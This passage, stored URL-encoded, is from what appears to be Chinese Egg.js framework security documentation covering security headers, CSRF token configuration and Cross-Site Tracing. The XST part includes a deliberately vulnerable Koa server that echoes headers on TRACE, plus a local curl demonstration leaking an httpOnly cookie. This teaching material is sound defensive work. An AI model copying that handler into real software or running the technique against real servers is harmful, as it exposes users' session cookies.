%98%AF%E7%94%A8%E6%9D%A5%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2%E5%8F%AF%E4%BB%A5%E5%8A%A0%E8%BD%BD%E5%93%AA%E4%BA%9B%E8%B5%84%E6%BA%90%EF%BC%8C%E5%87%8F%E5%B0%91%20XSS%20%E7%9A%84%E5%8F%91%E7%94%9F%E3%80%82%0A%0A%E6%A1%86%E6%9E%B6%E5%86%85%E6%94%AF%E6%8C%81%20CSP%20%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%98%AF%E9%BB%98%E8%AE%A4%E5%85%B3%E9%97%AD%E7%9A%84%EF%BC%8C%E5%BC%80%E5%90%AF%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%9C%89%E6%95%88%E7%9A%84%E9%98%B2%E6%AD%A2%20XSS%20%E6%94%BB%E5%87%BB%E7%9A%84%E5%8F%91%E7%94%9F%E3%80%82%E8%A6%81%E9%85%8D%E7%BD%AE%20CSP%20%2C%20%E9%9C%80%E8%A6%81%E5%AF%B9%20CSP%20%E7%9A%84%20policy%20%E7%AD%96%E7%95%A5%E6%9C%89%E4%BA%86%E8%A7%A3%EF%BC%8C%E5%85%B7%E4%BD%93%E7%BB%86%E8%8A%82%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%20%5BCSP%20%E6%98%AF%E4%BB%80%E4%B9%88%5D(https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F21979782)%E3%80%82%0A%0A%23%23%23%23%20X-Download-Options%3Anoopen%0A%0A%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%EF%BC%8C%E7%A6%81%E7%94%A8%20IE%20%E4%B8%8B%E4%B8%8B%E8%BD%BD%E6%A1%86Open%E6%8C%89%E9%92%AE%EF%BC%8C%E9%98%B2%E6%AD%A2%20IE%20%E4%B8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E9%BB%98%E8%AE%A4%E8%A2%AB%E6%89%93%E5%BC%80%20XSS%E3%80%82%0A%0A%23%23%23%23%20X-Content-Type-Options%3Anosniff%0A%0A%E7%A6%81%E7%94%A8%20IE8%20%E8%87%AA%E5%8A%A8%E5%97%85%E6%8E%A2%20mime%20%E5%8A%9F%E8%83%BD%E4%BE%8B%E5%A6%82%20%60text%2Fplain%60%20%E5%8D%B4%E5%BD%93%E6%88%90%20%60text%2Fhtml%60%20%E6%B8%B2%E6%9F%93%EF%BC%8C%E7%89%B9%E5%88%AB%E5%BD%93%E6%9C%AC%E7%AB%99%E7%82%B9%20serve%20%E7%9A%84%E5%86%85%E5%AE%B9%E6%9C%AA%E5%BF%85%E5%8F%AF%E4%BF%A1%E7%9A%84%E6%97%B6%E5%80%99%E3%80%82%0A%0A%23%23%23%23%20X-XSS-Protection%0A%0AIE%20%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E4%BA%9B%20XSS%20%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E8%8C%83%EF%BC%8C%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%0A%0A-%20close%20%E9%BB%98%E8%AE%A4%E5%80%BCfalse%EF%BC%8C%E5%8D%B3%E8%AE%BE%E7%BD%AE%E4%B8%BA%20%601%3B%20mode%3Dblock%60%0A%0A%23%23%20%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20CSRF%20%20%E7%9A%84%E9%98%B2%E8%8C%83%0A%0A%5BCSRF%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCSRF)%EF%BC%88Cross-site%20request%20forgery%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%8C%E4%B9%9F%E8%A2%AB%E7%A7%B0%E4%B8%BA%20%60One%20Click%20Attack%60%20%E6%88%96%E8%80%85%20%60Session%20Riding%60%EF%BC%8C%E9%80%9A%E5%B8%B8%E7%BC%A9%E5%86%99%E4%B8%BA%20CSRF%20%E6%88%96%E8%80%85%20XSRF%EF%BC%8C%E6%98%AF%E4%B8%80%E7%A7%8D%E5%AF%B9%E7%BD%91%E7%AB%99%E7%9A%84%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8%E3%80%82%0ACSRF%20%E6%94%BB%E5%87%BB%E4%BC%9A%E5%AF%B9%E7%BD%91%E7%AB%99%E5%8F%91%E8%B5%B7%E6%81%B6%E6%84%8F%E4%BC%AA%E9%80%A0%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%B8%A5%E9%87%8D%E5%BD%B1%E5%93%8D%E7%BD%91%E7%AB%99%E7%9A%84%E5%AE%89%E5%85%A8%E3%80%82%E5%9B%A0%E6%AD%A4%E6%A1%86%E6%9E%B6%E5%86%85%E7%BD%AE%E4%BA%86%20CSRF%20%E9%98%B2%E8%8C%83%E6%96%B9%E6%A1%88%E3%80%82%0A%0A%23%23%23%20%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A%E9%80%9A%E5%B8%B8%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%AF%B9%E4%BA%8E%20CSRF%20%E6%94%BB%E5%87%BB%E6%9C%89%E4%B8%80%E4%BA%9B%E9%80%9A%E7%94%A8%E7%9A%84%5B%E9%98%B2%E8%8C%83%E6%96%B9%E6%A1%88%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCross-Site_Request_Forgery_%2528CSRF%2529_Prevention_Cheat_Sheet%23CSRF_Specific_Defense)%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%87%A0%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E9%98%B2%E8%8C%83%E6%96%B9%E6%A1%88%EF%BC%9A%0A%0A-%20Synchronizer%20Tokens%EF%BC%9A%E9%80%9A%E8%BF%87%E5%93%8D%E5%BA%94%E9%A1%B5%E9%9D%A2%E6%97%B6%E5%B0%86%20token%20%E6%B8%B2%E6%9F%93%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%B8%8A%EF%BC%8C%E5%9C%A8%20form%20%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E7%9A%84%E6%97%B6%E5%80%99%E9%80%9A%E8%BF%87%E9%9A%90%E8%97%8F%E5%9F%9F%E6%8F%90%E4%BA%A4%E4%B8%8A%E6%9D%A5%E3%80%82%0A-%20Double%20Cookie%20Defense%EF%BC%9A%E5%B0%86%20token%20%E8%AE%BE%E7%BD%AE%E5%9C%A8%20Cookie%20%E4%B8%AD%EF%BC%8C%E5%9C%A8%E6%8F%90%E4%BA%A4%20post%20%E8%AF%B7%E6%B1%82%E7%9A%84%E6%97%B6%E5%80%99%E6%8F%90%E4%BA%A4%20Cookie%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%20header%20%E6%88%96%E8%80%85%20body%20%E5%B8%A6%E4%B8%8A%20Cookie%20%E4%B8%AD%E7%9A%84%20token%EF%BC%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%E6%A0%A1%E9%AA%8C%E3%80%82%0A-%20Custom%20Header%EF%BC%9A%E4%BF%A1%E4%BB%BB%E5%B8%A6%E6%9C%89%E7%89%B9%E5%AE%9A%E7%9A%84%20header%EF%BC%88%E4%BE%8B%E5%A6%82%20%60X-Requested-With%3A%20XMLHttpRequest%60%EF%BC%89%E7%9A%84%E8%AF%B7%E6%B1%82%E3%80%82%E8%BF%99%E4%B8%AA%E6%96%B9%E6%A1%88%E5%8F%AF%E4%BB%A5%E8%A2%AB%E7%BB%95%E8%BF%87%EF%BC%8C%E6%89%80%E4%BB%A5%20rails%20%E5%92%8C%20django%20%E7%AD%89%E6%A1%86%E6%9E%B6%E9%83%BD%5B%E6%94%BE%E5%BC%83%E4%BA%86%E8%AF%A5%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(https%3A%2F%2Fwww.djangoproject.com%2Fweblog%2F2011%2Ffeb%2F08%2Fsecurity%2F)%E3%80%82%0A%0A%E6%A1%86%E6%9E%B6%E7%BB%93%E5%90%88%E4%BA%86%E4%B8%8A%E8%BF%B0%E5%87%A0%E7%A7%8D%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AF%E9%85%8D%E7%BD%AE%E7%9A%84%20CSRF%20%E9%98%B2%E8%8C%83%E7%AD%96%E7%95%A5%E3%80%82%0A%0A%23%23%23%23%20%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%0A%0A%23%23%23%23%23%20%E5%90%8C%E6%AD%A5%E8%A1%A8%E5%8D%95%E7%9A%84%20CSRF%20%E6%A0%A1%E9%AA%8C%0A%0A%E5%9C%A8%E5%90%8C%E6%AD%A5%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2%E6%97%B6%EF%BC%8C%E5%9C%A8%E8%A1%A8%E5%8D%95%E8%AF%B7%E6%B1%82%E4%B8%AD%E5%A2%9E%E5%8A%A0%E4%B8%80%E4%B8%AA%20name%20%E4%B8%BA%20%60_csrf%60%20%E7%9A%84%20url%20query%EF%BC%8C%E5%80%BC%E4%B8%BA%20%60ctx.csrf%60%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%94%A8%E6%88%B7%E5%9C%A8%E6%8F%90%E4%BA%A4%E8%BF%99%E4%B8%AA%E8%A1%A8%E5%8D%95%E7%9A%84%E6%97%B6%E5%80%99%E4%BC%9A%E5%B0%86%20CSRF%20token%20%E6%8F%90%E4%BA%A4%E4%B8%8A%E6%9D%A5%EF%BC%9A%0A%0A%60%60%60html%0A%3Cform%20method%3D%22POST%22%20action%3D%22%2Fupload%3F_csrf%3D%7B%7B%20ctx.csrf%20%7C%20safe%20%7D%7D%22%20enctype%3D%22multipart%2Fform-data%22%3E%0A%20%20title%3A%20%3Cinput%20name%3D%22title%22%20%2F%3E%0A%20%20file%3A%20%3Cinput%20name%3D%22file%22%20type%3D%22file%22%20%2F%3E%0A%20%20%3Cbutton%20type%3D%22submit%22%3Eupload%3C%2Fbutton%3E%0A%3C%2Fform%3E%0A%60%60%60%0A%0A%E4%BC%A0%E9%80%92%20CSRF%20token%20%E7%9A%84%E5%AD%97%E6%AE%B5%E5%8F%AF%E4%BB%A5%E5%9C%A8%E9%85%8D%E7%BD%AE%E4%B8%AD%E6%94%B9%E5%8F%98%EF%BC%9A%0A%0A%60%60%60js%0A%2F%2F%20config%2Fconfig.default.js%0Amodule.exports%20%3D%20%7B%0A%20%20security%3A%20%7B%0A%20%20%20%20csrf%3A%20%7B%0A%20%20%20%20%20%20queryName%3A%20'_csrf'%2C%20%2F%2F%20%E9%80%9A%E8%BF%87%20query%20%E4%BC%A0%E9%80%92%20CSRF%20token%20%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AD%97%E6%AE%B5%E4%B8%BA%20_csrf%0A%20%20%20%20%20%20bodyName%3A%20'_csrf'%2C%20%2F%2F%20%E9%80%9A%E8%BF%87%20body%20%E4%BC%A0%E9%80%92%20CSRF%20token%20%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AD%97%E6%AE%B5%E4%B8%BA%20_csrf%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%E4%B8%BA%E4%BA%86%E9%98%B2%E8%8C%83%20%5BBREACH%20%E6%94%BB%E5%87%BB%5D(http%3A%2F%2Fbreachattack.com%2F)%EF%BC%8C%E9%80%9A%E8%BF%87%E5%90%8C%E6%AD%A5%E6%96%B9%E5%BC%8F%E6%B8%B2%E6%9F%93%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%B8%8A%E7%9A%84%20CSRF%20token%20%E5%9C%A8%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E6%97%B6%E9%83%BD%E4%BC%9A%E5%8F%98%E5%8C%96%EF%BC%8C%5Begg-view-nunjucks%5D%20%E7%AD%89%20View%20%E6%8F%92%E4%BB%B6%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%AF%B9%20Form%20%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AF%B9%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E8%80%85%E6%97%A0%E6%84%9F%E7%9F%A5%E3%80%82%0A%0A%23%23%23%23%23%20AJAX%20%E8%AF%B7%E6%B1%82%0A%0A%E5%9C%A8%20CSRF%20%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E4%B8%8B%EF%BC%8Ctoken%20%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E5%9C%A8%20Cookie%20%E4%B8%AD%EF%BC%8C%E5%9C%A8%20AJAX%20%E8%AF%B7%E6%B1%82%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BB%8E%20Cookie%20%E4%B8%AD%E5%8F%96%E5%88%B0%20token%EF%BC%8C%E6%94%BE%E7%BD%AE%E5%88%B0%20query%E3%80%81body%20%E6%88%96%E8%80%85%20header%20%E4%B8%AD%E5%8F%91%E9%80%81%E7%BB%99%E6%9C%8D%E5%8A%A1%E7%AB%AF%E3%80%82%0A%0AIn%20jQuery%3A%0A%0A%60%60%60js%0Avar%20csrftoken%20%3D%20Cookies.get('csrfToken')%3B%0A%0Afunction%20csrfSafeMethod(method)%20%7B%0A%20%20%2F%2F%20these%20HTTP%20methods%20do%20not%20require%20CSRF%20protection%0A%20%20return%20(%2F%5E(GET%7CHEAD%7COPTIONS%7CTRACE)%24%2F.test(method))%3B%0A%7D%0A%24.ajaxSetup(%7B%0A%20%20beforeSend%3A%20function(xhr%2C%20settings)%20%7B%0A%20%20%20%20if%20(!csrfSafeMethod(settings.type)%20%26%26%20!this.crossDomain)%20%7B%0A%20%20%20%20%20%20xhr.setRequestHeader('x-csrf-token'%2C%20csrftoken)%3B%0A%20%20%20%20%7D%0A%20%20%7D%2C%0A%7D)%3B%0A%60%60%60%0A%0A%E9%80%9A%E8%BF%87%20header%20%E4%BC%A0%E9%80%92%20CSRF%20token%20%E7%9A%84%E5%AD%97%E6%AE%B5%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%9C%A8%E9%85%8D%E7%BD%AE%E4%B8%AD%E6%94%B9%E5%8F%98%EF%BC%9A%0A%0A%60%60%60js%0A%2F%2F%20config%2Fconfig.default.js%0Amodule.exports%20%3D%20%7B%0A%20%20security%3A%20%7B%0A%20%20%20%20csrf%3A%20%7B%0A%20%20%20%20%20%20headerName%3A%20'x-csrf-token'%2C%20%2F%2F%20%E9%80%9A%E8%BF%87%20header%20%E4%BC%A0%E9%80%92%20CSRF%20token%20%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AD%97%E6%AE%B5%E4%B8%BA%20x-csrf-token%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%23%23%23%23%20Session%20vs%20Cookie%20%E5%AD%98%E5%82%A8%0A%0A%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E4%B8%8B%EF%BC%8C%E6%A1%86%E6%9E%B6%E4%BC%9A%E5%B0%86%20CSRF%20token%20%E5%AD%98%E5%9C%A8%20Cookie%20%E4%B8%AD%EF%BC%8C%E4%BB%A5%E6%96%B9%E4%BE%BF%20AJAX%20%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E5%88%B0%E3%80%82%E4%BD%86%E6%98%AF%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E9%83%BD%E5%8F%AF%E4%BB%A5%E8%AE%BE%E7%BD%AE%20Cookie%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%BD%93%E6%88%91%E4%BB%AC%E7%9A%84%E5%BA%94%E7%94%A8%E5%A4%84%E4%BA%8E%E6%97%A0%E6%B3%95%E4%BF%9D%E8%AF%81%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E9%83%BD%E5%8F%97%E6%8E%A7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%AD%98%E6%94%BE%E5%9C%A8%20Cookie%20%E4%B8%AD%E5%8F%AF%E8%83%BD%E6%9C%89%E8%A2%AB%20CSRF%20%E6%94%BB%E5%87%BB%E7%9A%84%E9%A3%8E%E9%99%A9%E3%80%82%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%80%E4%B8%AA%E9%85%8D%E7%BD%AE%E9%A1%B9%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%B0%86%20token%20%E5%AD%98%E6%94%BE%E5%88%B0%20Session%20%E4%B8%AD%E3%80%82%0A%0A%60%60%60js%0A%2F%2F%20config%2Fconfig.default.js%0Amodule.exports%20%3D%20%7B%0A%20%20security%3A%20%7B%0A%20%20%20%20csrf%3A%20%7B%0A%20%20%20%20%20%20useSession%3A%20true%2C%20%2F%2F%20%E9%BB%98%E8%AE%A4%E4%B8%BA%20false%EF%BC%8C%E5%BD%93%E8%AE%BE%E7%BD%AE%E4%B8%BA%20true%20%E6%97%B6%EF%BC%8C%E5%B0%86%E4%BC%9A%E6%8A%8A%20csrf%20token%20%E4%BF%9D%E5%AD%98%E5%88%B0%20Session%20%E4%B8%AD%0A%20%20%20%20%20%20cookieName%3A%20'csrfToken'%2C%20%2F%2F%20Cookie%20%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%8C%E9%BB%98%E8%AE%A4%E4%B8%BA%20csrfToken%0A%20%20%20%20%20%20sessionName%3A%20'csrfToken'%2C%20%2F%2F%20Session%20%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%8C%E9%BB%98%E8%AE%A4%E4%B8%BA%20csrfToken%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%23%23%23%23%20%E5%BF%BD%E7%95%A5%20JSON%20%E8%AF%B7%E6%B1%82(%E5%B7%B2%E5%BA%9F%E5%BC%83)%0A%0A**%E6%B3%A8%E6%84%8F%EF%BC%9A%E8%AF%A5%E9%80%89%E9%A1%B9%E5%B7%B2%E5%BA%9F%E5%BC%83%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%5B%E9%80%9A%E8%BF%87%20flash%20%2B%20307%20%E6%9D%A5%E6%94%BB%E7%A0%B4%5D(https%3A%2F%2Fwww.geekboy.ninja%2Fblog%2Fexploiting-json-cross-site-request-forgery-csrf-using-flash%2F)%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%89%93%E5%BC%80%E6%94%B9%E9%80%89%E9%A1%B9%EF%BC%81**%0A%0A%E5%9C%A8%20%5BSOP%5D(https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSame-origin_policy)%20%E7%9A%84%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E4%BF%9D%E6%8A%A4%E4%B8%8B%EF%BC%8C%E5%9F%BA%E6%9C%AC%E4%B8%8A%E6%89%80%E6%9C%89%E7%9A%84%E7%8E%B0%E4%BB%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E9%83%BD%E4%B8%8D%E5%85%81%E8%AE%B8%E8%B7%A8%E5%9F%9F%E5%8F%91%E8%B5%B7%20content-type%20%E4%B8%BA%20JSON%20%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%94%BE%E8%BF%87%E7%B1%BB%E5%9E%8B%E7%9A%84%20JSON%20%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AF%B7%E6%B1%82%E3%80%82%0A%0A%60%60%60js%0A%2F%2F%20config%2Fconfig.default.js%0Amodule.exports%20%3D%20%7B%0A%20%20security%3A%20%7B%0A%20%20%20%20csrf%3A%20%7B%0A%20%20%20%20%20%20ignoreJSON%3A%20true%2C%20%2F%2F%20%E9%BB%98%E8%AE%A4%E4%B8%BA%20false%EF%BC%8C%E5%BD%93%E8%AE%BE%E7%BD%AE%E4%B8%BA%20true%20%E6%97%B6%EF%BC%8C%E5%B0%86%E4%BC%9A%E6%94%BE%E8%BF%87%E6%89%80%E6%9C%89%20content-type%20%E4%B8%BA%20%60application%2Fjson%60%20%E7%9A%84%E8%AF%B7%E6%B1%82%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D%3B%0A%60%60%60%0A%0A%23%23%23%23%20%E5%88%B7%E6%96%B0%20CSRF%20token%0A%0A%20%E5%BD%93%20CSRF%20token%20%E5%AD%98%E5%82%A8%E5%9C%A8%20Cookie%20%E4%B8%AD%E6%97%B6%EF%BC%8C%E4%B8%80%E6%97%A6%E5%9C%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E5%8F%91%E7%94%9F%E7%94%A8%E6%88%B7%E5%88%87%E6%8D%A2%EF%BC%8C%E6%96%B0%E7%99%BB%E9%99%86%E7%9A%84%E7%94%A8%E6%88%B7%E5%B0%86%E4%BC%9A%E4%BE%9D%E6%97%A7%E4%BD%BF%E7%94%A8%E6%97%A7%E7%9A%84%20token%EF%BC%88%E4%B9%8B%E5%89%8D%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E7%9A%84%EF%BC%89%EF%BC%8C%E8%BF%99%E4%BC%9A%E5%B8%A6%E6%9D%A5%E4%B8%80%E5%AE%9A%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%9C%A8%E6%AF%8F%E6%AC%A1%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%9A%84%E6%97%B6%E5%80%99%E9%83%BD**%E5%BF%85%E9%A1%BB%E5%88%B7%E6%96%B0%20CSRF%20token**%E3%80%82%0A%0A%20%60%60%60js%0A%20%2F%2F%20login%20controller%0A%20exports.login%20%3D%20function*%20(ctx)%20%7B%0A%20%20%20const%20%7B%20username%2C%20password%20%7D%20%3D%20ctx.request.body%3B%0A%20%20%20const%20user%20%3D%20yield%20ctx.service.user.find(%7B%20username%2C%20password%20%7D)%3B%0A%20%20%20if%20(!user)%20ctx.throw(403)%3B%0A%20%20%20ctx.session%20%3D%20%7B%20user%20%7D%3B%0A%0A%20%20%20%2F%2F%20%E8%B0%83%E7%94%A8%20rotateCsrfSecret%20%E5%88%B7%E6%96%B0%E7%94%A8%E6%88%B7%E7%9A%84%20CSRF%20token%0A%20%20%20ctx.rotateCsrfSecret()%3B%0A%0A%20%20%20ctx.body%20%3D%20%7B%20success%3A%20true%20%7D%3B%0A%20%7D%0A%20%60%60%60%0A%0A%23%23%20%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20XST%20%E7%9A%84%E9%98%B2%E8%8C%83%0A%0A%5BXST%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXST)%20%E7%9A%84%E5%85%A8%E7%A7%B0%E6%98%AF%20%60Cross-Site%20Tracing%60%EF%BC%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%20TRACE%20%E8%AF%B7%E6%B1%82%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%89%E7%85%A7%E6%A0%87%E5%87%86%E5%AE%9E%E7%8E%B0%E4%BA%86%20TRACE%20%E5%93%8D%E5%BA%94%EF%BC%8C%E5%88%99%E5%9C%A8%20response%20body%20%E9%87%8C%E4%BC%9A%E8%BF%94%E5%9B%9E%E6%AD%A4%E6%AC%A1%E8%AF%B7%E6%B1%82%E7%9A%84%E5%AE%8C%E6%95%B4%E5%A4%B4%E4%BF%A1%E6%81%AF%E3%80%82%E9%80%9A%E8%BF%87%E8%BF%99%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E6%9F%90%E4%BA%9B%E6%95%8F%E6%84%9F%E7%9A%84%E5%A4%B4%E5%AD%97%E6%AE%B5%EF%BC%8C%E4%BE%8B%E5%A6%82%20httpOnly%20%E7%9A%84%20Cookie%E3%80%82%0A%0A%E4%B8%8B%E9%9D%A2%E6%88%91%E4%BB%AC%E5%9F%BA%E4%BA%8E%20Koa%20%E6%9D%A5%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%94%AF%E6%8C%81%20TRACE%20%E6%96%B9%E6%B3%95%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9A%0A%0A%60%60%60javascript%0A%20%20var%20koa%20%3D%20require('koa')%3B%0A%20%20var%20app%20%3D%20koa()%3B%0A%0A%20%20app.use(function*%20(next)%20%7B%0A%20%20%20%20this.cookies.set('a'%2C%201%2C%20%7B%20httpOnly%3A%20true%20%7D)%3B%0A%20%20%20%20if%20(this.method%20%3D%3D%3D%20'TRACE')%20%7B%0A%20%20%20%20%20%20var%20body%20%3D%20''%3B%0A%20%20%20%20%20%20for%20(header%20in%20this.headers)%20%7B%0A%20%20%20%20%20%20%20%20body%20%2B%3D%20header%20%2B%20'%3A%20'%20%2B%20this.headers%5Bheader%5D%20%2B%20'%5Cr%5Cn'%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20this.body%20%3D%20body%3B%0A%20%20%20%20%7D%0A%20%20%20%20yield*%20next%3B%0A%20%20%7D)%3B%0A%0A%20%20app.listen(7001)%3B%0A%60%60%60%0A%0A%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%90%8E%EF%BC%8C%E5%85%88%E5%8F%91%E4%B8%AA%20GET%20%E8%AF%B7%E6%B1%82%20%60curl%20-i%20http%3A%2F%2F127.0.0.1%3A7001%60%EF%BC%8C%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8B%E5%93%8D%E5%BA%94%EF%BC%9A%0A%0A%60%60%60%0AHTTP%2F1.1%20200%20OK%0AX-Powered-By%3A%20koa%0ASet-Cookie%3A%20a%3D1%3B%20path%3D%2F%3B%20httponly%0AContent-Type%3A%20text%2Fplain%3B%20charset%3Dutf-8%0AContent-Length%3A%202%0ADate%3A%20Thu%2C%2006%20Nov%202014%2005%3A04%3A42%20GMT%0AConnection%3A%20keep-alive%0A%0AOK%0A%60%60%60%0A%0A%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BE%E7%BD%AE%E4%BA%86%E4%B8%80%E4%B8%AA%20httpOnly%20%E7%9A%84%20Cookie%20%E4%B8%BA%201%EF%BC%8C%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%8C%E6%98%AF%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96%E5%AE%83%E7%9A%84%E3%80%82%0A%0A%E6%8E%A5%E7%9D%80%E6%88%91%E4%BB%AC%E5%8F%91%20TRACE%20%E8%AF%B7%E6%B1%82%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%60curl%20-X%20TRACE%20-b%20a%3D1%20-i%20http%3A%2F%2F127.0.0.1%3A7001%60%EF%BC%8C%E5%B9%B6%E5%B8%A6%E4%B8%8A%20Cookie%EF%BC%8C%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8B%E5%93%8D%E5%BA%94%EF%BC%9A%0A%0A%60%60%60%0A%20%20HTTP%2F1.1%20200%20OK%0A%20%20X-Powered-By%3A%20koa%0A%20%20Set-Cookie%3A%20a%3D1%3B%20path%3D%2F%3B%20httponly%0A%20%20Content-Type%3A%20text%2Fplain%3B%20charset%3Dutf-8%0A%20%20Content-Length%3A%2073%0A%20%20Date%3A%20Thu%2C%2006%20Nov%202014%2005%3A07%3A47%20GMT%0A%20%20Connection%3A%20keep-alive%0A%0A%20%20user-agent%3A%20curl%2F7.37.1%0A%20%20host%3A%20127.0.0.1%3A7001%0A%20%20accept%3A%20*%2F*%0A%20%20cookie%3A%20a%3D1%0A%60%60%60%0A%0A%E5%9C%A8%E5%93%8D%E5%BA%94%E4%BD%93%E9%87%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%AE%8C%E6%95%B4%E7%9A%84%E5%A4%B4%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E7%BB%95%E8%BF%87%E4%BA%86%20httpOnly%20%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E6%8B%BF%E5%88%B0%E4%BA%86cookie%3D1%EF%BC%8C%E9%80%A0%E6%88%90%E4%BA%86%E5%BE%88%E5%A4%A7%E7%9A%84%E9%A3%8E%E9%99%A9%E3%80%82%0A%0A%23%23%23%20%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB%0A%0Ahttp%3A%2F%2Fwww.w3.org%2FProtocols%2Frfc2616%2Frfc2616-sec9.html%0A%0Ahttp%3A%2F%2Fdeadliestwebattacks.com%2F2010%2F05%2F18%2Fcross-si